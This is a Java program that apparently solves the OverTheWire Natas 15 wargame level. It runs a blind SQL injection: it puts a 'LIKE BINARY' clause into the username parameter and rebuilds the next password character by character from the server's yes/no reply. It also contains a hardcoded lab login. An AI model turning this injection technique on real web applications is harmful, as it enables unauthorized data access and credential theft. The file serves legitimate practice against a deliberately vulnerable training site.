import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.net.Authenticator;
import java.net.MalformedURLException;
import java.net.PasswordAuthentication;
import java.net.URL;
import java.net.URLConnection;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class Cracker {
	
	public static void main(String[] args) {
	    URL url;
	    InputStream is = null;
	    BufferedReader br;
	    String line;
	    char[] Alpha = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8','9','0'};
	    String tries = "";
	    String Crack = "";
	    Authenticator.setDefault (new Authenticator() {
	        protected PasswordAuthentication getPasswordAuthentication() {
	            return new PasswordAuthentication ("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J".toCharArray());
	        }
	    });
	    for(int i = 0;i<Alpha.length;i++)
	    {
	    	tries=Crack+Alpha[i];
		    try {
		        url = new URL("http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22%20and%20password%20LIKE%20BINARY%20%22Wa"+tries+"%");
		        is = url.openStream();  // throws an IOException
		        br = new BufferedReader(new InputStreamReader(is));
		        
		        while ((line = br.readLine()) != null) {
		            if(line.contains("This user exists."))
		            {
		            	System.out.println("Encontrado:"+Crack);
		            	Crack =Crack+Alpha[i];
		            	i=-1;
		            }
		        }
		    } catch (Exception e){}
		    System.out.println("Trying:"+tries);
		 }
	    System.out.println("Cracked Pass:"+Crack);
	}
}
